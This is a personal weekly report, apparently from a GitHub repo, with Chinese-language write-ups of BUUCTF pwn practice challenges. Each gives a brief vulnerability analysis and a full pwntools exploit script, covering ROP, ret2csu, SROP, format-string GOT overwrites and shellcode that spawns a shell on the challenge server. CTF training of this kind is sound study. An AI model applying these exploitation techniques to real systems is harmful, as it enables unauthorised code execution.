# week5
# 1.BUUCTF-picoctf_2018_shellcode
vuln函数输入shellcode

<img width="208" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/efecac50-593e-40ac-9877-1966868c3ed3">

返回到main函数后输入会被直接执行
### exp_PicoCTF_2018_shellcode.py
```python
from pwn import *
# p = process("./PicoCTF_2018_shellcode")
p = remote("node4.buuoj.cn",27464)
context.log_level = 'debug'
context.arch = 'i386'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

sc = asm(shellcraft.sh())

ru("Enter a string!\n")
sl(sc)

shell()
```


## 2.jarvisoj_level5
栈溢出

<img width="273" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/7527ba93-aa8b-402b-b2cc-be09b691c222">

能够用来泄漏libc的函数只有write 但write函数需要3个参数 在64位下很少有传递3个参数的gadget

考虑通过ret2csu来调用write函数泄漏libc

### exp_level3_x64.py
```python
from pwn import *
# p = process("./level3_x64")
p = remote("node4.buuoj.cn",29777)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
libc = ELF('/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

write_got = 0x000000000600a58
vuln = 0x0000000004005E6
pop_rdi_ret = 0x00000000004006b3

offset = 136
csu1 = 0x000000000400690
csu2 = 0x0000000004006A6

# junk --> 0xdeadbeef rbx --> 0 rbp --> 1
# r12 --> call r13 --> rdx r14 --> rsi r15 --> edi

# 1.ret2csu --> leak libc
paylaod = b'A' * offset 
paylaod+= p64(csu2) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(write_got)
paylaod+= p64(0x8) + p64(write_got) + p64(1)
paylaod+= p64(csu1) + p64(0) * 7 + p64(vuln)

ru("Input:\n")
raw_input("Ther")
sl(paylaod)

libc_write = u64(ru('\x7f').ljust(8, '\x00'))
success("libc_write ==> {}".format(hex(libc_write)))

libc_base = libc_write - libc.symbols["write"]
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

libc_binsh = libc_base + libc.search('/bin/sh').next()
success("libc_binsh ==> {}".format(hex(libc_binsh)))

# 2.system("/bin/sh")

paylaod = b'A' * offset + p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system)

ru("Input:\n")
raw_input("Ther")
sl(paylaod)

shell()
```


## 3.BUUCTF-ciscn_2019_es_7
程序就调用了两个函数read和write 其中read函数明显存在溢出

<img width="657" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/cbdc640b-e59c-4f23-ba3c-2f6c20820a41">

在往上看到了几个gadget

<img width="510" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/d5ac323f-4d93-4b06-845e-1234051cc17e">

查了一下 系统调用号为15的是sigreturn

`sigreturn` 是一个系统调用（syscall），用于在 Unix/Linux 操作系统中从中断处理程序中返回到用户空间程序。当一个进程收到一个信号（signal）时，操作系统会暂停进程的执行，保存当前进程的状态信息，然后转而执行与该信号相关联的信号处理程序（signal handler）。当信号处理程序执行完毕后，操作系统会使用 `sigreturn` 将进程状态恢复到信号发生时的状态，然后再将进程恢复执行。

具体来说，在执行信号处理程序时，系统会将进程的当前上下文（包括程序计数器、栈指针等）保存在用户态栈（user stack）中，然后将栈指针指向信号处理程序的栈帧（stack frame）。当信号处理程序执行完毕时，系统会使用 `sigreturn` 恢复用户态栈中保存的进程上下文，并将栈指针恢复到信号发生时的位置，然后再将进程恢复执行。

需要注意的是，`sigreturn` 并不是一个常规的系统调用，它不是通过系统调用表（system call table）来执行的，而是通过中断向量表（interrupt vector table）来执行的。因此，`sigreturn` 的实现方式与常规的系统调用有所不同。

简单来说 我们可以在sigreturn前修改各寄存器的值 在sigreturn返回后 寄存器值就会恢复到我们修改的值

也就是说我们可以通过sigreturn来控制任意寄存器的值 那就好办了 直接调用execve("/bin/sh",0,0)就可以了

但我们还缺少"/bin/sh"字符串 所以可以先构造一个read函数来将"/bin/sh"字符串读入到程序中

```python
# 1.read(0, bss, 0x40)
frameExecve = SigreturnFrame() 
frameExecve.rax = 0
frameExecve.rdi = 0
frameExecve.rsi = bss
frameExecve.rdx = 0x40
frameExecve.rip = syscall_ret
frameExecve.rsp = bss+0x30

payload = b'A' * offset + p64(sigret) + p64(syscall_ret) 
payload+= str(frameExecve)

raw_input("Ther")
sl(payload)
```

这里构造一个read(0, bss, 0x40)来调用read函数 因为是使用syscall去调用read(eax=0) 所以还涉及到一个返回的问题

syscall之后会有ret操作 这个ret需要重新返回到vuln函数中来再次调用read进行溢出，以此来执行execve

所以此时的栈顶就是我们的返回地址 一个比较简单的方法就是直接修改rsp寄存器 使其指向bss段中我们能控制输入的地址

```python
payload = b'/bin/sh\x00' + p64(0)*5 + p64(vuln)
raw_input("Ther")
sl(payload)
```

然后在read进行输入时 直接将vuln的地址放在保存的rsp寄存器的地址 此时syscall后的ret就会重新返回到vuln中

接下来再进行同样的操作调用execve即可

```python
# 2.execve("/bin/sh", 0, 0")
frameExecve = SigreturnFrame() 
frameExecve.rax = 59
frameExecve.rdi = bss
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_ret

payload = b'A' * offset + p64(sigret) + p64(syscall_ret)
payload+= str(frameExecve)

raw_input("Ther")
sl(payload)
```

### exp_ciscn_2019_es_7.py
```python
from pwn import *
p = process("./ciscn_2019_es_7")
# p = remote("node4.buuoj.cn",29614)
context.log_level = 'debug'
context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

bss = 0x602000 - 0x500
vuln = 0x0000000004004ED

syscall_ret = 0x000000000400517
sigret = 0x0000000004004DA
leave_ret = 0x0000000000400537
offset = 16

# 1.read(0, bss, 0x40)
frameExecve = SigreturnFrame() 
frameExecve.rax = 0
frameExecve.rdi = 0
frameExecve.rsi = bss
frameExecve.rdx = 0x40
frameExecve.rip = syscall_ret
frameExecve.rsp = bss+0x30

payload = b'A' * offset + p64(sigret) + p64(syscall_ret) 
payload+= str(frameExecve)

raw_input("Ther")
sl(payload)

payload = b'/bin/sh\x00' + p64(0)*5 + p64(vuln)
raw_input("Ther")
sl(payload)

# 2.execve("/bin/sh", 0, 0")
frameExecve = SigreturnFrame() 
frameExecve.rax = 59
frameExecve.rdi = bss
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_ret

payload = b'A' * offset + p64(sigret) + p64(syscall_ret)
payload+= str(frameExecve)

raw_input("Ther")
sl(payload)

shell()
```

## 4.BUUCTF-cmcc_pwnme2
无限制栈溢出

<img width="267" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/caef0b84-ef45-46ed-8ba5-f140d183eb9d">

有两个add_home和add_flag函数 只要参数正确即可将flag路径拼接到string字符串中 最后再调用exec_string函数即可打印flag

<img width="426" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/4a06efb9-bc69-40a6-b7f6-8c1073216761">

<img width="291" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fcf4e05b-2672-4175-b520-d012d96de943">

由于是32位程序 通过栈传递参数 可以利用pop ret去做ROP

```python
payload = b'A'*off1 + p32(add_home_addr) + p32(pop_ret) + p32(0xdeadbeef)
payload+= p32(add_flag_addr) + p32(pop2_ret) + p32(0xCAFEBABE) + p32(0xABADF00D)
payload+= p32(exec_string)
```

但本题还有一个更简单的做法 在知道flag的路径后 可以直接通过gets函数去输入string 然后直接执行exec_string

```python
payload = b'A' * off1 + p32(gets_plt) + p32(exec_string) + p32(string)
```

### exp_pwnme2.py
```python
from pwn import *
# p = process("./pwnme2")
p = remote("node4.buuoj.cn",27879)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

string = 0x804A060
add_home_addr = 0x8048644
add_flag_addr = 0x8048682
main = 0x80486F8
exec_string = 0x80485CB

gets_plt = 0x8048440
pop_ret = 0x08048409
pop2_ret = 0x0804867f

off1 = 112

# payload = b'A'*off1 + p32(add_home_addr) + p32(pop_ret) + p32(0xdeadbeef)
# payload+= p32(add_flag_addr) + p32(pop2_ret) + p32(0xCAFEBABE) + p32(0xABADF00D)
# payload+= p32(exec_string)

payload = b'A' * off1 + p32(gets_plt) + p32(exec_string) + p32(string)

ru("Please input:\n")
raw_input("Ther")
sl(payload)

shell()
```

## 5.BUUCTF-picoctf_2018_got_shell
拥有任意地址写能力

<img width="830" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/26035b99-46e9-4d03-b405-3729ebf57a61">

在修改后调用了puts函数 程序存在后门函数win 可以考虑修改puts_got为win函数地址

### exp_PicoCTF_2018_got-shell.py
```python
from pwn import *
# p = process("./PicoCTF_2018_got-shell")
p = remote("node4.buuoj.cn",25647)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

puts_got = 0x804a00c
win = 0x804854B

ru('4 byte value?\n')
raw_input("Ther")
sl('0x804a00c')

ru('write to')
raw_input("Ther")
sl('0x804854B')

shell()
```

## 6.BUUCTF-mrctf2020_shellcode_revenge
可见字符shellcode

首先利用pwntools生成默认的shellcode 输入到文件中

然后通过alpha3工具将其转化成可见字符的shellcode

```sh
python ./ALPHA3.py x64 ascii mixedcase rax --input="sc.bin" > out.bin
```

### exp_mrctf2020_shellcode_revenge.py
```python
from pwn import *
# p = process("./mrctf2020_shellcode_revenge")
p = remote("node4.buuoj.cn",27656)
context.log_level = 'debug'
context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

sc = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'

raw_input("Ther")
ru('Show me your magic!\n')
s(sc)

shell()
```

## 7.BUUCTF-wdb_2018_2nd_easyfmt
无限格式化字符串漏洞

<img width="248" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fd33cb71-15a8-4847-a865-9b8dd23ff31b">

首先通过格式化字符串读泄漏libc 再覆盖printf_got为system或one_gadget

### exp_wdb_2018_2nd_easyfmt.py
```python
from pwn import *
# p = process("./wdb_2018_2nd_easyfmt")
p = remote("node4.buuoj.cn",26089)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-32.so")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

printf_got = 0x804a014

offset = 6

# 1.leak libc
payload = p32(printf_got) + b'%6$s'

ru('repeater?\n')
raw_input("Ther")
sl(payload)

rx(4)

libc_printf = u32(rx(4))
success("libc_printf ==> {}".format(hex(libc_printf)))

libc_base = libc_printf - libc.symbols['printf']
success("libc_base ==> {}".format(hex(libc_base)))

ones = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
# ones = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065, 0x5f066]

# one_gadget = libc_base + ones[5]
# success("one_gadget ==> {}".format(hex(one_gadget)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

# 2.printf_got --> system
payload = fmtstr_payload(6, {printf_got:libc_system}, write_size='short')

raw_input("Ther")
sl(payload)

raw_input("Ther")
sl("/bin/sh")

shell()
```

## 8.BUUCTF-mrctf2020_easy_equation
只要满足等式即可执行system

<img width="872" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/afdf1646-00fa-4354-bb46-8616df0d265f">

利用格式化字符串写将judge修改为2即可 或者直接溢出覆盖返回地址为system

### exp_mrctf2020_easy_equation.py
```python
from pwn import *
# p = process("./mrctf2020_easy_equation")
p = remote("node4.buuoj.cn",27947)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

judge = 0x00000000060105C
system = 0x0000000004006D0

payload = b'a' * 9 + p64(system)

raw_input("Ther")
sl(payload)

shell()
```

## BUUCTF-picoctf_2018_can_you_gets_me
无限制栈溢出 静态链接 无libc

<img width="275" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/f046c567-29b5-4aac-a502-76b60b15c605">

直接通过ROPgadget生成rop链

### exp_PicoCTF_2018_can-you-gets-me.py
```python
from pwn import *
# sh = process("./PicoCTF_2018_can-you-gets-me")
sh = remote("node4.buuoj.cn",27015)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : sh.recv()
rx = lambda x: sh.recv(x)
ru = lambda x: sh.recvuntil(x)
rud = lambda x: sh.recvuntil(x, drop=True)
s = lambda x: sh.send(x)
sl = lambda x: sh.sendline(x)
sa = lambda x, y: sh.sendafter(x, y)
sla = lambda x, y: sh.sendlineafter(x, y)
shell = lambda : sh.interactive()

p = ''
p += p32(0x0806f02a) # pop edx ; ret
p += p32( 0x080ea060) # @ .data
p += p32( 0x080b81c6) # pop eax ; ret
p += '/bin'
p += p32( 0x080549db) # mov dword ptr [edx], eax ; ret
p += p32( 0x0806f02a) # pop edx ; ret
p += p32( 0x080ea064) # @ .data + 4
p += p32( 0x080b81c6) # pop eax ; ret
p += '//sh'
p += p32( 0x080549db) # mov dword ptr [edx], eax ; ret
p += p32( 0x0806f02a) # pop edx ; ret
p += p32( 0x080ea068) # @ .data + 8
p += p32( 0x08049303) # xor eax, eax ; ret
p += p32( 0x080549db) # mov dword ptr [edx], eax ; ret
p += p32( 0x080481c9) # pop ebx ; ret
p += p32( 0x080ea060) # @ .data
p += p32( 0x080de955) # pop ecx ; ret
p += p32( 0x080ea068) # @ .data + 8
p += p32( 0x0806f02a) # pop edx ; ret
p += p32( 0x080ea068) # @ .data + 8
p += p32( 0x08049303) # xor eax, eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0807a86f) # inc eax ; ret
p += p32( 0x0806cc25) # int 0x80


payload = b'A' * 28 + p
ru("GIVE ME YOUR NAME!\n")

sl(payload)

shell()
```

## 9.BUUCTF-actf_2019_babystack
存在0x10byte的溢出 并且能够知道我们的输入的地址（栈地址）

<img width="420" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/80c7e62f-a490-45a1-902d-5ba3e2269c7b">

可溢出的字节有限 考虑使用栈迁移扩大我们能利用的空间 我们将gadget写到我们输入的开始位置（stack）

然后在最后覆盖ebp为stack-8 返回地址为leave_ret gadget 这样在程序返回时 就会去stack位置执行我们的gadget

第一次gadget为泄漏libc 我们还需要一次控制程序的机会去调用system

所以在第一次leak libc后 将ebp复原 然后再跳转到main函数中 以此进行下一次劫持控制流 具体如下

```python
# 1.leak stack
ru('>')
sl(str(0xE0))

ru('Your message will be saved at ')

stack = int(rx(14), 16)
success("stack ==> {}".format(hex(stack)))

# 2.leak libc
payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload+= p64(pop_rbp_ret) + p64(stack+0xD0+0x30) + p64(main)
payload = payload.ljust(offset, b'A') + p64(stack-8)
payload+= p64(leave_ret)

ru('>')
raw_input("Ther")
s(payload)
```

泄漏libc后 再次劫持程序控制流 执行system("/bin/sh")

```python
ru('>')
# raw_input("Ther")
sl(str(0xE0))

ru('Your message will be saved at ')
stack = int(rx(14), 16)
success("stack ==> {}".format(hex(stack)))

# 3.system("/bin/sh")
payload = p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system)
payload = payload.ljust(offset, b'A') + p64(stack-8)
payload+= p64(leave_ret)
```

### exp_ACTF_2019_babystack.py
```python
from pwn import *
# p = process("./ACTF_2019_babystack")
p = remote("node4.buuoj.cn",28277)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu18/libc-2.27-64.so")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

pop_rdi_ret = 0x0000000000400ad3
leave_ret = 0x0000000000400a18
puts_got = 0x0000000000601020
puts_plt = 0x400730
pop_rbp_ret = 0x0000000000400860

main = 0x00000000040098D
# main = 0x000000000400956

offset = 216 - 8

# 1.leak stack
ru('>')
sl(str(0xE0))

ru('Your message will be saved at ')

stack = int(rx(14), 16)
success("stack ==> {}".format(hex(stack)))

# 2.leak libc
payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload+= p64(pop_rbp_ret) + p64(stack+0xD0+0x30) + p64(main)
payload = payload.ljust(offset, b'A') + p64(stack-8)
payload+= p64(leave_ret)

ru('>')
raw_input("Ther")
s(payload)

ru("Byebye~\n")

libc_puts = u64(rx(6).ljust(8, '\x00'))
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

libc_binsh = libc_base + libc.search('/bin/sh').next()
success("libc_binsh ==> {}".format(hex(libc_binsh)))

ru('>')
# raw_input("Ther")
sl(str(0xE0))

ru('Your message will be saved at ')
stack = int(rx(14), 16)
success("stack ==> {}".format(hex(stack)))

# 3.system("/bin/sh")
payload = p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system)
payload = payload.ljust(offset, b'A') + p64(stack-8)
payload+= p64(leave_ret)

ru('>')
# raw_input("Ther")
s(payload)

shell()
```

## 10.BUUCTF-inndy_echo
无限制格式化字符串利用

<img width="368" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/352f297d-ee4c-48b0-bfbe-e0b4121294c0">

程序中有system函数 直接覆盖printf_got为system即可

### exp_echo.py
```python
from pwn import *
# p = process("./echo")
p = remote("node4.buuoj.cn",28052)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

offset = 7

printf_got = 0x804a010
system_plt = 0x8048400

payload = fmtstr_payload(7, {printf_got:system_plt}, write_size='byte')

raw_input("Ther")
sl(payload)

raw_input("Ther")
sl('/bin/sh')

shell()
```

## 11.BUUCTF-suctf_2018_basic pwn
栈溢出覆盖返回地址为backdoor

### exp_SUCTF_2018_basic_pwn.py
```python
from pwn import *
# p = process("./SUCTF_2018_basic_pwn")
p = remote("node4.buuoj.cn",25341)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

offset = 280
backdoor = 0x000000000401157

payload = b'A' * offset + p64(backdoor)
raw_input("Ther")
sl(payload)

shell()
```

## 12.BUUCTF-x_ctf_b0verfl0w
没开启NX 存在溢出

<img width="292" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/96f7e784-7355-409b-9a7f-aeb8f7358a55">

考虑通过jmp esp gadget直接跳到栈上执行shellcode 但要求shellcode长度不超过36 

并且在jmp esp后 此时的栈顶装的并不是shellcode 需要再通过一个跳板（"sub esp, 0x28; call esp"）来跳到shellcode

### exp_b0verfl0w.py
```python
from pwn import *
# p = process("./b0verfl0w")
p = remote("node4.buuoj.cn",26695)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

sub_esp_0x24_ret = 0x8048500
jmp_esp = 0x8048504

offset = 36

# sc = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
sc = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"


payload = sc.ljust(offset, '\x90') + p32(jmp_esp) + asm('sub esp,0x28;call esp')

ru("What's your name?\n")
raw_input("Ther")
sl(payload)

shell()
```

## 13.BUUCTF-picoctf_2018_leak_me
本题是利用局部变量之间没有间隙来泄漏password

栈上有一个name和password变量 name大小的空间结束之后正好是password 通过将name变量填充满

这样在输出name时就会将passwrod也一起输出（没有被'\x00'截断）

## 14.BUUCTF-wustctf2020_name_your_cat
数组溢出 没有检查数组的边界

<img width="660" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/31e438f9-e4c0-4e29-aa91-78872ab5cf80">

计算好偏移溢出覆盖返回地址为后门函数即可

<img width="299" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/5105f48a-c2e1-44c3-b75c-be50a4acae57">

### exp_wustctf2020_name_your_cat.py
```python
from pwn import *
# p = process("./wustctf2020_name_your_cat")
p = remote("node4.buuoj.cn",27681)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

shell_addr = 0x80485CB
offset = 7

for i in range(5):
	ru('>')
	sl(str(offset))
	ru('Give your name plz: ')
	sl(p32(shell_addr))

shell()
```

## 14.BUUCTF-axb_2019_fmt64
无限制格式化字符串利用

<img width="380" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/292e03bd-6b40-4153-aa05-8e60d9c09970">

泄漏libc 覆盖printf_got为one_gadget 需要注意的就是构造格式化字符串写时要注意之前写入的字符个数

### exp_axb_2019_fmt64.py
```python
from pwn import *
# p = process("./axb_2019_fmt64")
p = remote("node4.buuoj.cn",25285)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")


r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

offset = 8

puts_got = 0x000000000601018
printf_got = 0x000000000601030

# 1.leak libc
payload = b'%9$saaaa' + p64(puts_got)
ru('Please tell me:')
raw_input("Ther")
sl(payload)

libc_puts = u64(ru('\x7f')[-6:].ljust(8, b'\x00'))
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

# ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
ones = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

one_gadget = libc_base + ones[0]
success("one_gadget ==> {}".format(hex(one_gadget)))

one1 = one_gadget & 0xffff
one2 = (one_gadget >> 16) & 0xffff

success("one1 ==> {}".format(hex(one1)))
success("one2 ==> {}".format(hex(one2)))

# 2.printf_got --> one_gadget
payload	= b'%' + str(one1-9) + 'c%12$hnaaaa'
if (one2 - one1) > 0:
	payload+= b'%' + str(one2-one1-4) + 'c%13$hnaaa'
else:
	payload+= b'%' + str(one2-one1+0x10000-4) + 'c%13$hnaaa'

payload+= p64(printf_got) + p64(printf_got+2) 

success("payload ==> {}".format(payload))

ru('Please tell me:')
raw_input("Ther")
sl(payload)

shell()
```

## 15.BUUCTF-cmcc_pwnme1
getfruit函数存在栈溢出

<img width="311" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/0f35319b-f265-41e3-b0ba-20e137335745">

正常溢出覆盖返回地址为getflag即可 但在BUUCTF中flag路径不对 于是ret2libc

### exp_pwnme1.py
```python
from pwn import *
# p = process("./pwnme1")
p = remote("node4.buuoj.cn",25762)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-32.so")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

offset = 168
get_flag = 0x8048677

puts_plt = 0x8048548
puts_got = 0x804a028
main = 0x80486F4

ru(">> 6. Exit    \n")
raw_input("Ther")
sl('5')

# 1.leak libc
payload = b'A' * offset + p32(puts_plt) + p32(main) + p32(puts_got)
ru("Please input the name of fruit:")
sl(payload)

libc_puts = u32(ru('\xf7')[-4:])
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

libc_binsh = libc_base + libc.search('/bin/sh').next()
success("libc_binsh ==> {}".format(hex(libc_binsh)))

# 2.system("/bin/sh")
ru(">> 6. Exit    \n")
raw_input("Ther")
sl('5')

payload = b'A' * offset + p32(libc_system) + p32(0xdeadbeef) + p32(libc_binsh)
ru("Please input the name of fruit:")
sl(payload)

